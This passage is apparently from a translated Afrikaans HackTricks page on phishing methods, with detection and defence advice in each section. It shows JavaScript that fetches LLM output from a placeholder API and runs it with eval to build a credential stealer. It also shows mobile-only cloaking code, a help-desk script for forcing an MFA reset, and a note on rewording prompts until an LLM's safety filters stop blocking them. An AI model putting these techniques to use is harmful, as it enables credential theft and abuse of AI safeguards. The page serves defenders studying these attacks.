Dit is ’n **afleweringsmeganisme**, nie op sigself ’n uitbuiting nie: die uitvoering van JavaScript in ’n advertensieweergewekonteks installeer nie outomaties spyware nie. Die onderliggende blaaier- of OS-uitbuiting is nie bekend gemaak nie, en daarom is ’n advertensie-indruk of versoek aan die besluitbediener alleen nie bewys van ’n infeksie nie. Sien [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md) vir die identifiseerderkoppelingsaspek van RTB-teikening.<sup>[[14]](#references)</sup>

## Uitvissingbedrywighede versterk met AI
Aanvallers koppel nou **LLM- en stemklonings-API’s** vir volledig gepersonaliseerde lokboodskappe en interaksie intyds.

| Laag | Voorbeeldgebruik deur bedreigingsakteur |
|-------|-----------------------------|
|Outomatisering|Genereer en stuur >100 k e-posse / SMS-boodskappe met ewekansige bewoording en naspoorbare skakels.|
|Generatiewe AI|Skep *eenmalige* e-posse wat na openbare M&A verwys, interne grappies van sosiale media insluit; gebruik ’n deepfake-stem van die uitvoerende hoof in ’n terugbel-swendelary.|
|Agentiese AI|Registreer domeine outonoom, skraap oopbroninligting en stel e-posse vir die volgende stadium op wanneer ’n slagoffer klik maar nie aanmeldbesonderhede indien nie.|

**Verdediging:**  
• Voeg **dinamiese baniere** by wat boodskappe uitlig wat deur onbetroubare outomatisering gestuur is (via ARC/DKIM-afwykings).  
• Ontplooi **stem-biometriese uitdagingfrases** vir hoërisiko-telefoonversoeke.  
• Simuleer AI-gegenereerde lokboodskappe deurlopend in bewusmakingsprogramme – statiese sjablone is verouderd.

Sien ook – misbruik van agentiese blaai vir uitvissing van aanmeldbesonderhede:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Sien ook – misbruik van plaaslike CLI-gereedskap en MCP deur AI-agente (vir voorraadopname en opsporing van geheime):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-ondersteunde samestelling van uitvissing-JavaScript tydens looptyd (kodegenerering in die blaaier)

Aanvallers kan HTML wat onskuldig lyk aflewer en **die stealer tydens looptyd genereer** deur ’n **vertroude LLM-API** vir JavaScript te vra en dit dan in die blaaier uit te voer (bv. met `eval` of ’n dinamiese `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt as obfuskasie:** enkodeer eksfiltrasie-URL’s/Base64-stringe in die prompt; verander die bewoording iteratief om veiligheidsfilters te omseil en hallusinasies te verminder.
2. **API-oproep aan kliëntkant:** wanneer die bladsy laai, roep JS ’n openbare LLM (Gemini/DeepSeek/etc.) of ’n CDN-instaanbediener aan; slegs die prompt/API-oproep is in die statiese HTML teenwoordig.
3. **Stel saam en voer uit:** voeg die antwoord saam en voer dit uit (polimorfies per besoek):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** gegenereerde kode verpersoonlik die lokaas (bv. LogoKit-tokenontleding) en stuur creds na die prompt-versteekte endpoint.

**Ontduikingseienskappe**
- Verkeer gaan na bekende LLM-domeine of betroubare CDN-proxies; soms via WebSockets na ’n backend.
- Geen statiese payload nie; kwaadwillige JS bestaan eers ná weergawe.
- Nie-deterministiese generering lewer **unieke** stealers per sessie.

**Opsporingsidees**
- Laat sandboxes met JS geaktiveer loop; merk **runtime-`eval`/dinamiese skripskepping wat van LLM-antwoorde afkomstig is**.
- Soek na front-end-POSTs na LLM-API’s, onmiddellik gevolg deur `eval`/`Function` op die teruggestuurde teks.
- Stel waarskuwings in vir domeine van ongemagtigde LLM’s in kliëntverkeer, gevolg deur credential-POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Benewens klassieke push-bombing dwing operateurs bloot **’n nuwe MFA-registrasie af** tydens die hulptoonbankoproep, wat die gebruiker se bestaande token ongeldig maak. Enige daaropvolgende aanmeldversoek lyk vir die slagoffer legitiem.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Monitor vir AzureAD/AWS/Okta-gebeurtenisse waar **`deleteMFA` + `addMFA`** binne minute van dieselfde IP af plaasvind.



## Clipboard Hijacking / Pastejacking

Aanvallers kan ongemerk kwaadwillige opdragte vanaf ’n gekompromitteerde of typosquatted-webblad na die slagoffer se knipbord kopieer en die gebruiker dan mislei om dit in **Win + R**, **Win + X** of ’n terminale venster te plak, waardeur arbitrêre kode uitgevoer word sonder enige aflaai of aanhegsel.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp-toestelkoppelingskaping via QR social engineering
* ’n Lokbladsy (bv. ’n vals ministerie/CERT-“kanaal”) vertoon ’n WhatsApp Web/Desktop-QR-kode en gee die slagoffer opdrag om dit te skandeer, wat die aanvaller ongemerk as ’n **gekoppelde toestel** byvoeg.<sup>[[12]](#references)</sup>
* Die aanvaller kry onmiddellik sigbaarheid van kletse en kontakte totdat die sessie verwyder word. Slagoffers kan later ’n kennisgewing sien dat ’n “nuwe toestel gekoppel” is; verdedigers kan soek na onverwagte toestelkoppelingsgebeurtenisse kort ná besoeke aan onbetroubare QR-bladsye.

### Mobielbeperkte phishing om crawlers/sandboxes te ontduik
Operateurs beperk hul phishing-vloei toenemend met ’n eenvoudige toestelkontrole sodat desktop-crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein script wat toets of die DOM aanraking ondersteun en die resultaat na ’n bediener-eindpunt stuur; nie-mobiele kliënte ontvang HTTP 500 (of ’n leë bladsy), terwyl mobiele gebruikers die volledige vloei kry.<sup>[[7]](#references)</sup>

Minimale kliëntbrokkie (tipiese logika):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` logic (simplified):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Bedienergedrag wat dikwels waargeneem word:
- Stel ’n sessiekoekie tydens die eerste laai.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Gee 500 (of ’n plekhouer) terug vir daaropvolgende GET-versoeke wanneer `is_mobile=false`; lewer phishing-inhoud slegs as `true`.

Heuristieke vir jag en opsporing:
- urlscan-navraag: `filename:"detect_device.js" AND page.status:500`
- Webtelemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-mobiele toestelle; wettige paaie vir mobiele slagoffers gee 200 terug, gevolg deur HTML/JS.
- Blokkeer of ondersoek bladsye waarvan die inhoud uitsluitlik afhang van `ontouchstart` of soortgelyke toestelkontroles.

Verdedigingswenke:
- Laat crawlers met mobiele vingerafdrukke en JS geaktiveer loop om inhoud wat agter kontroles versteek word, bloot te lê.
- Stel waarskuwings in vir verdagte 500-antwoorde ná `POST /detect` op domeine wat onlangs geregistreer is.

## References

- [1] [Genereer domeinvariasies wat in phishing gebruik word (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing opspoor: Gereedskap en tegnieke (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Steel geloofsbriewe en omseil 2FA met noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Steel sessies en omseil 2FA met EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Hoe om DKIM met Postfix op Debian Wheezy te installeer en op te stel (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42-verslag oor wêreldwye insidentreaksie – uitgawe oor sosiale manipulasie](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Stil smishing – mobiele-gereguleerde phishing-infrastruktuur en heuristieke (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Die volgende grens van runtime-samestellingsaanvalle: Gebruik LLM’s om phishing-JavaScript intyds te genereer](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Nabootsing, klik-kaping en TDS: Binne ’n ekosisteem vir die verspreiding van malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting van Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Verkeer na Microsoft se windows.com kaap met bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Liefde? Eintlik: Vals datingtoepassing gebruik as lokmiddel in geteikende spioenwareveldtog in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC’s en monsters](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [AdFection blootgelê: Hoe Discover-Tech geteikende advertensies in ’n kanaal vir spioenware vir huur met geen klik omgeskep het](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
